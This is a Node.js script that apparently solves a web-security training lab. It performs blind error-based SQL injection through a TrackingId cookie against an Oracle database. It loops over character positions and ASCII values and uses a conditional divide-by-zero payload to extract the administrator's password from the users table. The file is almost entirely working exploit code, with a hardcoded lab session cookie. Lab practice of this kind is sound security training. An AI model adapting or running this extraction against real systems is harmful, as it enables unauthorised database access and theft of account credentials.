#!/usr/bin/env node

import process from 'node:process';

// Global Constants...
const mainUrl = 'https://0adc007403725f7f80c2081800ea0070.web-security-academy.net/';
const session = 'StHQRNspsz4yomdZp7VE7ARlQvK1DB8a';
const trackingId = 'TPU6KLo1qhDllGNf';

process.on('SIGINT', () => {
  console.log('\n[!] Saliendo...\n');
  process.exit(1);
});

const request = async (sqlQuery, retries = 10, delay = 1000) => {
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      const response = await fetch(mainUrl, {
        method: 'GET',
        headers: {
          'Cookie': `TrackingId=${trackingId}${sqlQuery}; session=${session}`,
        },
      });

      return response;
    } catch (e) {
      if (attempt < retries) {
        await new Promise(res => setTimeout(res, delay));
      } else {
        throw new Error(`[!] Todos los intentos fallaron: ${e.message}`);
      }
    }
  }
}

const main = async () => {
  let response;
  let length = 20;
  let result = '';
  
  for (let position = 1; position < length + 1; position++) {
    for (let character = 0; character < 128; character++) {
      const query = `' || (SELECT CASE WHEN ((SELECT ascii(substr(password,${position},1)) FROM users WHERE username='administrator')='${character}') THEN '' else TO_CHAR(1/0) END FROM dual)-- -`;
      response = await request(query);

      process.stdout.write(`\r[+] Result: ${result} | Position: ${position} - Character: ${character}`);

      if (response.status === 200) {
        result += String.fromCharCode(character);
        (position === length) && process.stdout.write(`\r[+] Success: ${result}\n`);
        break;
      }
    }
  }
}

(async () => {
  await main();
})();
